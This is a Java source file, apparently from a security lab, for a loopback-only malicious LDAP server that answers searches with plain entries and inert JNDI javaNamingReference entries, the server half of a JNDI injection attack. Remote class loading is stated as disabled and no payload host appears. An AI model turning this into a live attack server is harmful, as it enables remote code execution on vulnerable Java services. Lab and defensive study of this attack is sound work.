package dev.sch39.attacker;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import java.net.InetAddress;

public class AttackerLdapServer {

    private static final int PORT = 1389;
    private static final String BASE_DN = "dc=lab,dc=local";

    static final String ENTRY_DN = "ou=entry," + BASE_DN;
    static final String REFERENCE_DN = "ou=reference," + BASE_DN;

    public static void main(String[] args) throws Exception {

        InMemoryDirectoryServerConfig cfg = new InMemoryDirectoryServerConfig(BASE_DN);

        cfg.setListenerConfigs(
                InMemoryListenerConfig.createLDAPConfig(
                        "ldap",
                        InetAddress.getByName("127.0.0.1"),
                        PORT,
                        null)); // plaintext, lab only

        cfg.addInMemoryOperationInterceptor(new DualFixtureInterceptor());

        InMemoryDirectoryServer server = new InMemoryDirectoryServer(cfg);
        server.startListening();

        System.out.println("[ldap-attacker-server] listening on 127.0.0.1:" + PORT);
        System.out.println("[ldap-attacker-server] mode     = DUAL");
        System.out.println("[ldap-attacker-server] fixture A = " + ENTRY_DN);
        System.out.println("[ldap-attacker-server] fixture B = " + REFERENCE_DN);
        System.out.println("[ldap-attacker-server] remote class loading = DISABLED");

        Thread.currentThread().join();
    }

    static final class DualFixtureInterceptor extends InMemoryOperationInterceptor {

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            System.out.println("[ldap-attacker-server] search received: " + base);

            try {
                Entry entry;
                String kind;

                if (ENTRY_DN.equalsIgnoreCase(base)) {
                    entry = PlainEntryFixture.build(base);
                    kind = "entry";
                } else if (REFERENCE_DN.equalsIgnoreCase(base)) {
                    entry = buildReferenceEntry(base);
                    kind = "reference";
                } else {
                    System.out.println("[ldap-attacker-server] unknown base DN: " + base);
                    result.setResult(new LDAPResult(0, ResultCode.NO_SUCH_OBJECT));
                    return;
                }

                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                System.out.println("[ldap-attacker-server] sent "
                        + kind + " response for " + base);

            } catch (Exception e) {
                System.out.println("[ldap-attacker-server] error: " + e);
                result.setResult(new LDAPResult(
                        0, ResultCode.OPERATIONS_ERROR));
            }
        }

        private static Entry buildReferenceEntry(String baseDn) {
            Entry entry = new Entry(baseDn);
            Reference ref = InertReferenceFixture.build();

            entry.addAttribute("objectClass", "javaNamingReference");
            entry.addAttribute("javaClassName", ref.getClassName());

            if (ref.getFactoryClassName() != null) {
                entry.addAttribute("javaFactory", ref.getFactoryClassName());
            }

            // javaReferenceAddress harus diformat sebagai:
            // #<index>#<type>#<value>
            // sesuai spesifikasi JNDI/RFC 2713.
            for (int i = 0; i < ref.size(); i++) {
                javax.naming.RefAddr addr = ref.get(i);
                String formatted = "#" + i + "#" + addr.getType() + "#" + addr.getContent();
                entry.addAttribute("javaReferenceAddress", formatted);
            }

            return entry;
        }
    }
}